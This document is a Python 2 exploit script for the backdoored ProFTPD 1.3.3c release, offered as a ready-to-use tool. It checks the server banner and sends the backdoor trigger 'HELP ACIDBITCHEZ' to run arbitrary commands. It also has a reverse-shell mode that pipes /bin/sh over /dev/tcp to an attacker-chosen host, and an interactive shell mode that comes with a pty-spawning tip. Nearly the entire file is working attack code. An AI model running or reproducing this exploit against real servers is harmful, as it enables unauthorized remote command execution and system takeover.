#!/usr/bin/python2
#-*- coding:utf-8 -*-


import socket
import time
import sys
import platform
import threading
import os

try:
	from datetime import datetime
except ImportError:
	print("\033[31m[!] Error Datetime Not Found !")

try:
	import nclib
except ImportError:
	print("\033[31m[!] Nclib Not Found !")


BANNER = r'''
                      ______            __   _____________     
    ____  _________  / __/ /_____  ____/ /  <  /__  /__  /_____
   / __ \/ ___/ __ \/ /_/ __/ __ \/ __  /   / / /_ < /_ </ ___/
  / /_/ / /  / /_/ / __/ /_/ /_/ / /_/ /   / /___/ /__/ / /__  
 / .___/_/   \____/_/  \__/ .___/\__,_/   /_//____/____/\___/  
/_/                      /_/                                   
			
			Created By Unam3dd
			Github : Unam3dd
'''

VULNERABLE_VERSION = "ProFTPD 1.3.3c"


def nclib_import_or_not():
	if 'Linux' not in platform.platform():
		return False

	elif 'Windows' not in platform.platform():
		return True

def clear_os():
	if 'Linux' not in platform.platform():
		os.system('cls')

	elif 'Windows' not in platform.platform():
		os.system('clear')


def check_vulnerable(ip,port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		print("\033[32m[\033[34m+\033[32m] Try To Connect... => %s:%s" % (ip,port))
		s.connect((ip,int(port)))
		version = s.recv(4096)
		s.close()
		if VULNERABLE_VERSION in version:
			return True
		else:
			return False
	except:
		print("\033[31m[!] Error Connect To %s:%s" % (ip,port))


def send_payload(ip,port,cmd):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((ip,int(port)))
		data = s.recv(4096)
		print(data)
		print("\033[32m[\033[34m+\033[32m] Sending Payload...\033[00m")
		s.send("HELP ACIDBITCHEZ\r\n")
		print("\033[32m[\033[34m+\033[32m] Payload Injected !\033[00m")
		print("\033[32m[\033[34m+\033[32m] Sending Command !\033[00m")
		s.send("%s\n" % (cmd))
		data = s.recv(4096)
		print("\033[32m[\033[34m+\033[32m] Output : %s\n\033[00m" % (data))
	except:
		print("\033[32m[\033[31m-\033[32m] Error Sending Payload !\033[00m")


def ishell(ip,port):
    print("\033[32m[\033[34m+\033[32m] Try To Opening The Shell Session on \033[34m%s\033[32m:\033[34m%d\033[00m" % (ip,int(port)))
    int_port = int(port)
    try:
        nc = nclib.Netcat((ip,int_port))
        version = nc.recv(4096)
        print("\033[32m[\033[34m+\033[32m] Version FTP : %s" % (version))
        nc.send("HELP ACIDBITCHEZ\r\n")
        print("""\033[32m[\033[34m+\033[32m] Shell Open !\n\033[32m[\033[34m+\033[32m] Enter This Command For Get tty Shell => \033[33mpython -c "import pty;pty.spawn('/bin/bash')"\033[00m""")
        nc.interact()
        print("\033[31m[!] Exiting Shell Session !")
        nc.send("bye\r\n")
        nc.close()
    except KeyboardInterrupt:
        print("[*] CTRL+C")


if __name__ == '__main__':
	clear_os()
	clear_os()
	print("\033[32m"+BANNER)
	if len(sys.argv) < 3:
		print("usage : %s <ip> <port> <command>                     | Execute Command And Get Output" % (sys.argv[0]))
		print("        %s <ip> <port> reverse_shell <lhost> <lport> | reverse shell to LHOST:LPORT" % (sys.argv[0]))
		print("        %s <ip> <port> shell                         | (Linux Only) Get Interactive Shell On Proftpd 1.3.3c" % (sys.argv[0]))
	else:

		if sys.argv[3] =="reverse_shell":
			lhost = sys.argv[4]
			lport = sys.argv[5]
			send_payload(sys.argv[1],sys.argv[2],"exec /bin/sh 0</dev/tcp/%s/%s 1>&0 2>&0" % (lhost,lport))
		
		elif sys.argv[3] =="shell":
			ishell(sys.argv[1],sys.argv[2])

		else:
			vuln = check_vulnerable(sys.argv[1],sys.argv[2])
			if vuln ==True:
				print("\033[32m[\033[34m+\033[32m] Target is Vulnerable !")
				send_payload(sys.argv[1],sys.argv[2],sys.argv[3])
			else:
				print("\033[32m[\033[34m+\033[32m] Target is Not Vulnerable !")
